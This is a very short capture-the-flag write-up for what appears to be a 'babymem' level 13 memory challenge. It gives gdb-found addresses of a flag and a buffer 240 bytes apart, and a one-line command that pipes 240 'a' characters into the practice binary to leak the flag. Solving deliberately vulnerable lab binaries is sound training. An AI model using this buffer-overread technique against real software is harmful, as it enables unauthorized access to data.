With `gdb`, you can get the information like this in practice mode.
```
flag: 0x7ffc45105150
buffer: 0x7ffc45105060
```

Use the following command to get the flag.
```
(echo "240"; python -c "print('a' * 240)") | /babymem_level13_testing1
```
